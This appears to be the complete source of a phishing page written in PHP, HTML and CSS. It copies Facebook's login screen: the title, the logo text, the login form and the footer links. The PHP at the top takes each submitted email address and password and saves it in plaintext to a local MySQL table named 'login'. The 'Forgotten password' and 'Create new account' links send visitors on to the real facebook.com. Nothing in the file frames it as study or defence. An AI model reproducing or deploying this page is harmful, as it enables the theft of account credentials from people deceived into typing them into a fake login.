
<?php

if($_SERVER["REQUEST_METHOD"]=="POST"){

    $email=$_POST["email"];
    $pass=$_POST["password"];
    

    $dsn="mysql:host=localhost;dbname=login_facebook";
    $username="root";
    $password="";

    
    try{
        $conn=new PDO($dsn , $username , $password);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        //echo "Connected successfully<br>";
        $stmt = $conn->prepare("INSERT INTO `login`(`email`,`password`) VALUES(:email,:pass)");
        $stmt->bindParam(":email" , $email);
        $stmt->bindParam(":pass"  , $pass);
        $stmt->execute();            

    }catch(PDOException $e){
        echo "Error in Connection : ".$e->getMessage();

    }

}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel='stylesheet' type='text/css' media='screen' href='face.css'>
    <title>Facebook - log in or sign up</title>
</head>
<body>
    <div class="container flex">
        <div class="face-book flex">
            <div class="text">
                <h1>facebook</h1>
                <p class="w1">Facebook help you connect and</p>
                <p class="w1">share with the people in your life.</p>
            </div>
            <form action="" method="POST">
                <input type="email" placeholder="Email address or phone number" name="email" required>
                <input type="password" placeholder="Password"  name="password" required>
                <div class="link">
                <button type="submit"  class="login">Log in</button>
                <a href="http://www.facebook.com" class="forget">Forgotten password ?</a>
                </div>
                <hr/>
                <div class="button">
                    <a href="http://www.facebook.com">Create new account</a>
                </div>
            </form>
        </div>
       <!-- <a href="#" class="_8esh">Create a Page</a> for a celebrity, brand or business.-->

    </div>

   

    <div class="q1">
            <a class="q2" href="#">English (UK)</a>
            <a class="q2" href="#">العربية</a>
            <a class="q2" href="#">Français (France)</a>
            <a class="q2" href="#">Italiano</a>
            <a class="q2" href="#">Deutsch</a>
            <a class="q2" href="#">Русский</a>
            <a class="q2" href="#">Español</a>
            <a class="q2" href="#">Bahasa</a>
            <a class="q2" href="#">Indonesia</a>
            <a class="q2" href="#">Türkçe</a>
            <a class="q2" href="#">Português </a>
            <a class="q2" href="#">(Brasil)</a>
            <a class="q2" href="#">हिन्दी</a>
        <hr>
            <a class="q2" href="#" >Sign Up</a>
            <a class="q2" href="#">Log in</a>
            <a class="q2" href="#">Messenger</a>
            <a class="q2" href="#">Facebook</a>
            <a class="q2" href="#">Places</a>
            <a class="q2" href="#">Games</a>
            <a class="q2" href="#">Marketplace</a>
            <a class="q2" href="#">Meta Pay</a>
            <a class="q2" href="#">Meta Store</a>
            <a class="q2" href="#">Meta Quest</a>
            <a class="q2" href="#">Instagram</a>
            <a class="q2" href="#">Threads</a>
            <a class="q2" href="#">Fundraisers</a>
            <a class="q2" href="#">Services</a>
            <a class="q2" href="#">Voting Information Centre</a>
            <a class="q2" href="#">Privacy Policy</a>
            <a class="q2" href="#">Privacy Centre</a>
            <a class="q2" href="#">Groups</a>
            <a class="q2" href="#">About</a>
            <a class="q2" href="#">Create ad</a>
            <a class="q2" href="#">Create Page</a>
            <a class="q2" href="#">Developers</a>
            <a class="q2" href="#">Careers</a>
            <a class="q2" href="#">Cookies</a>
            <a class="q2" href="#">AdChoices</a>
            <a class="q2" href="#">Terms</a>
            <a class="q2" href="#">Help</a>
            <a class="q2" href="#">Contact uploading and non-users</a>
            <a class="q2" href="#">Settings</a>
            <a class="q2" href="#">Activity log</a>
            <br><br>
            <a class="q2" href="#">Meta © 2023</a>
     </div>




</body>
</html>

<style>

@import url('http://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Roboto',sans-serif;
}
.flex{
    display:flex;
    align-items:center;
    
}
.container .face-book .text{
    color:black;
    font-size:12px;
    width:100%;
    padding-top:100px;
}
.container .face-book .text .w1{
    width:100%;
    font-size:25px;
}
.q1{
    padding: 20px;
    color: #737373;
    margin: 0 auto;
    width: 980px;
}

.q2{
    font-size: 12px;
    display: inline;
    color:#8a8d91;
    text-decoration: none;
    padding: 10px 10px;
}
.q2:hover{
    text-decoration: underline;
}

.container{
    padding:0 15px;
    min-height:75vh;
    justify-content: center;
    background: #f0f2f5;
}
.face-book{
    justify-content:space-between;
    max-width: 1000px;
    width:100%;
    max-height: 65%;
    margin-top: -100px;

}
.face-book .text{
    margin-bottom:90px;
}
.face-book h1{
    color:#1877f2;
    font-size:4rem;
    margin-bottom:10px;
}
.face-book p{
    font-size:1.75rem;
    white-space: nowrap;
}
form{
    display:flex;
    flex-direction: column;
    background: #fff;
    border-radius: 8px;
    padding:20px;
    box-shadow: 0 2px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
    max-width: 400px;
    width: 100%;
    margin-top:-70px;
}
form input{
    height: 55px;
    width: 100%;
    border: 1px solid #ccc;
    border-radius: 6px;
    margin-bottom: 15px;
    font-size: 1rem;
    padding: 0 14px;
}
form input:focus{
    outline: none;
    border-color: #1877f2;
}
::placeholder{
    color:#777;
    font-size:1.063rem;
}
.link{
    display: flex;
    flex-direction: column;
    text-align:center;
    gap:15px;
}
.link .login{
    border: none;
    outline: none;
    cursor: pointer;
    background: #1877f2;
    padding: 15px 0;
    border-radius: 6px;
    color: #fff;
    font-size: 1.25rem;
    font-weight: 600;
    transition: 0.2s ease;
}
.link .login:hover{
    background: #0d65d9;
}
form a{
    text-decoration: none;
}
.link .forgot{
    color: #1877f2;
    font-size: 0.875rem;
}
.link .forgot:hover{
    text-decoration: underline;
}
hr{
    border: none;
    height:1px;
    background-color: #ccc;
    margin-bottom: 20px;
    margin-top: 20px;
}
.button{
    margin-top: 25px;
    text-align: center;
    margin-bottom: 20px;
}
.button a{
    padding: 15px 20px;
    background: #42b72a;
    border-radius: 6px;
    color: #fff;
    font-size: 1.063rem;
    font-weight: 600;
    transition: 0.2s ease;
}
.button a:hover{
    background: #3ba626;
}

@media (max-length:900){
    
    .face-book{
        flex-direction: column;
        text-align: center;
    }
    .face-book .text{
        margin-bottom: 30px;
    }
}
.flex {
    display: flex;
    align-items: center;
    display: block;
}
.container {
    padding: 2 2px;
    min-height: 75vh;
    height: 80%;
    width: 100%;
    justify-content: center;
    background: #f0f2f5;
    margin:0px -20px 0px 0px;
}
.q1{
    width:100%;
}
.container .face-book .text .w1 {
    width: 100%;
    font-size: 22px;
}
body{
    width:100%;
}

@media screen and(min-width:900){
    .flex {
    display: flex;
    align-items: center;
    display: inline-flex;
}
}


</style>